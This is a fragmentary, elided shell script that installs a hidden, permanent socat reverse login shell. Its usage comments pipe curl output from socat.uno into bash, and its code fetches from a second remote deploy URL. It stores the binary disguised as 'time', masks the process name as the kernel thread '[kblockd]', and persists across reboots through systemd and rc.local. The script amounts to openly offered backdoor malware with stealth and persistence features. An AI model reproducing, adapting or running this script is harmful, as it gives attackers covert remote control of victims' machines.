...
# Install and start a permanent socat reverse login shell
#
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL socat.uno)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL socat.uno)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL socat.uno)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL socat.uno)"
#
# Steps taken:
# 1. Download pre-compiled binary
# 2. Create a new secret (random)
# 3. Start socat as a interactive reverse login shell and hidden process
# 4. Install socat and automatically start after reboot
#
# Other variables:
# GS_DEBUG=1
#       - Verbose output
...
#         GS_HOST=127.0.0.1 GS_PORT=42KwLVv18KiFRZNHzuYNocRrrGdnGbPYAGDT9oHzwh6sMk1f53SVNN26X877au2DPq73BGzLAz9VSbkdBdMPjvtn68qd4CP.sh
# GS_USELOCAL=1
#       - Use local binaries (do not download)
# GS_USELOCAL_GSNC=<path to socat binary>
#       - Use local socat from source tree
# GS_NOSTART=1
#       - Do not start socat (for testing purpose only)
# GS_NOINST=1
...
# Global Defines
URL_BASE="https://socat.uno/socat/"
[[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
URL_DEPLOY="beautiful-bear-dungarees.cyclic.app/x"
# GS_VERSION=1.4.34
DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
# DL_CMD="$DL_CRL"
BIN_HIDDEN_NAME_DEFAULT=time
# Can not use '[kblockd/0]'. Bash without bashrc would use "/0] $" as prompt. 
PROC_HIDDEN_NAME_DEFAULT="[kblockd]"
CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CDR="\033[0;31m" # red
...
init_dstbin()
{
    ...
    try_dstdir "${GS_PREFIX}${HOME}/.config/time" && return

    # Try current working directory
    try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }

    # Try /tmp/.gsusr-*
    try_dstdir "/tmp/.socat-${UID}" && { IS_DSTBIN_TMP=1; return; }
...
init_vars()
{
    ...
    # 'killall' however matches time and on OSX we thus force killall
...
init_setup()
{
    ...
    # Do not add TERM= or SHELL= here because we do not like that to show in time.service
    ...
    # 2. Otherwise start time as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
...
uninstall()
{
    ...
    uninstall_rm "${GS_PREFIX}${HOME}/.config/time/${BIN_HIDDEN_NAME}"
    uninstall_rm "${GS_PREFIX}${HOME}/.config/time/gs-bd"
    ...
    uninstall_rm "${GS_PREFIX}${HOME}/.config/time/${SEC_NAME}"
    uninstall_rm "${GS_PREFIX}${HOME}/.config/time/gs-bd.dat" #OLD
    ...
    uninstall_rm "/etc/systemd/system/time.lock" #OLD
...
install_system_rclocal()
{
    ...
    # Thus we need to start /bin/bash -c in a sub-shell before 'exec socat'.
...
#   command -v socat >/dev/null || { FAIL_OUT "socat not found."; exit 255; }
#   OK_OUT

#   local gsnc_bin
#   gsnc_bin="$(command -v socat)"
...
#   ver_new="$(socat -h 2>&1 | grep ^Version | sed -E 's/Version (.*),.*/\1/g')"
...
test_network()
{
    ...
    # There should be no socat listening.
    # _GSOCKET_SERVER_CHECK_SEC=n makes socat try the connection.
...
try()
{
    ...
    dl "socat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
    OK_OUT
    ...
    [[ -f "${TMPDIR}/._socat" ]] && rm -f "${TMPDIR}/._socat" # from docker???
    [[ -n $GS_USELOCAL_GSNC ]] && {
        [[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
        xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/socat"
    }
    OK_OUT

    echo -en 2>&1 "Copying binaries......................................................"
    xmv "${TMPDIR}/socat" "$DSTBIN" || { FAIL_OUT; errexit; }
    chmod 700 "$DSTBIN"
    OK_OUT
...
# Download the socat_any-any.tar.gz and try all of the containing
...
gs_start()
{
    ...
    # GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill time'
    # ./deploy.sh -> re-installs new secret. Start time with _new_ secret.
    # Now two time's are running (which is correct)
    if [[ -n "$KL_CMD" ]]; then
...
init_setup
# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL socat.uno)"
[[ -n "$X" ]] && GS_SECRET_X="$X"
...
echo -e 2>&2 "--> ${CW}Join us on Telegram - https://t.me/overlayfs${CN}"
